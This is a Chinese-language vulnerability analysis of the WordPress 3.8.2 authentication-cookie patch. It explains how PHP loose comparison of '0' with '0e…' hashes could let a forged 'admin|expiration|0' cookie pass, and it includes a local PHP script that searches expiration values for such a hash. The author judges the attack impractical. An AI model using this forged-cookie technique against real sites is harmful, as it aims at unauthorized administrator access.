# WordPress 3.8.2 cookie伪造漏洞再分析

0x00 背景
-------

* * *

看了WordPress 3.8.2补丁分析 HMAC timing attack，眼界大开，原来还可以利用时间差来判断HMAC。

但我总觉得这个漏洞并不是简单的修复这个问题。

查看了官方提供的资料:“该漏洞是由WordPress的安全团队成员Jon Cave发现。”。

也许漏洞还有这样利用的可能。

0x01 PHP的特性
-----------

* * *

当PHP在进行 ”==”,”!=”等非严格匹配的情况下，会按照值的实际情况，进行强制转换。

```
<?php
var_dump(0 == '0'); // true
var_dump(0 == 'abcdefg'); // true  
var_dump(0 === 'abcdefg'); // false
var_dump(1 == '1abcdef'); // true  
?>

```

当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。

0x02 分析修复的代码
------------

* * *

官方版的diff只在php里改动了一个位置:

```
<?php
-  if ( $hmac != $hash ) {  
+  if ( hash_hmac( 'md5', $hmac, $key ) !== hash_hmac( 'md5', $hash, $key ) ) { 
?>

```

其中$hmac来源于cookies。是我们可控的一个输入参数。

```
<?php
Admin|1397564163|1f253e501c301bf5bf293c40d7d92ded
//$username = ‘Admin’;
//$expiration = 1397564163;
//$hmac = ‘1f253e501c301bf5bf293c40d7d92ded’;
?>

```

$hash是以下代码生成一个md5值。

```
<?php
$key = wp_hash($username . $pass_frag . '|' . $expiration, $scheme);
$hash = hash_hmac('md5', $username . '|' . $expiration, $key);
?>

```

当`$hmac == $hash`时，登录成功。

那么，有几种情况会登录成功。

```
<?php
//第一种情况，完全相等。
$hmac = ‘1f253e501c301bf5bf293c40d7d92ded’;
$hash = ‘1f253e501c301bf5bf293c40d7d92ded’;
//第二种情况.第一位为数字，第二位为字母
$hmac = 1;
$hash = ‘1f253e501c301bf5bf293c40d7d92ded’;
//第三种情况。第一位为字母
$hmac = 0;
$hash = ‘af253e501c301bf5bf293c40d7d92ded’;
?>

```

很明显，第三种出现的情况非常大。

那么我们有没有可能把$hmac构造成一个整数0呢？

0x03 漏洞利用
---------

* * *

我们看看cookie解析的代码：

```
<?php
    $cookie_elements = explode('|', $cookie);
    if ( count($cookie_elements) != 3 )
        return false;
    list($username, $expiration, $hmac) = $cookie_elements;
?>

```

当我们把cookie设置为：

```
Admin|1397564163|1

```

时。$hmac=’1’。但是，$hmac是字符串1，而不是整数1。

```
<?php
var_dump($hmac);//string(“1”);
?>

```

非常遗憾，这个漏洞是不能利用的。

难道官方修复的真的不是这个漏洞？

0x04 柳暗花明又一村
------------

* * *

还有什么情况能让字符串识别成整数吗？是的，还有！

```
<?php
var_dump("0" == "0e1234567890123456...32"); // true
?>

```

‘e’会识别为次方，0的N次方为0；

所以，这个漏洞的利用方式还可以是： 让$hmac = ‘0’;

通过改变$expiration来改变$hash。获得一个，第一位为0，第二位为e,后面所有位为数字的$hash.

```
<?php
$hmac = ‘0’;
$hash = ‘0e1234567890123456...32’;
var_dump($hmac == $hash);  // true
?>

```

0x05 攻击代码
---------

* * *

本地测试代码（实际攻击代码应该是构造cookies远程请求）：

```
<?php
    include( 'wp-load.php' );

    $user = get_userdata(1);
    $username = $user->user_login;
    $pass_frag = substr($user->user_pass, 8, 4);

    $expiration = 9999999999; //设置一个很大的过期时间，然后递减

    while($expiration >0){
        $key = wp_hash($username . $pass_frag . '|' . $expiration, 'auth');
        $hash = hash_hmac('md5', $username . '|' . $expiration, $key);
        if('0' == $hash OR '1'== $hash ){
            echo $expiration.'@'.$hash;
            file_put_contents('done.txt',$expiration.'@'.$hash);
            exit();
        }
        $expiration -= 1;//过期时间-1
        echo $expiration.'@'.$hash."\r\n";
    }
?>

```

通过改变过期时间，尝试碰撞到可以利用的hash。

按照理论值。碰撞到可以利用的$expiration几率是(2_1_10^30)/(16^32)。也就是5.8774717541114 * 10 -9。

理论上：把cookies设置成 “admin|碰撞到的过期时间|0”,就可以登陆后台了。

但是几率太小，还不如穷举密码了。

Ps：我本地跑了几个小时了，还没遇到一个。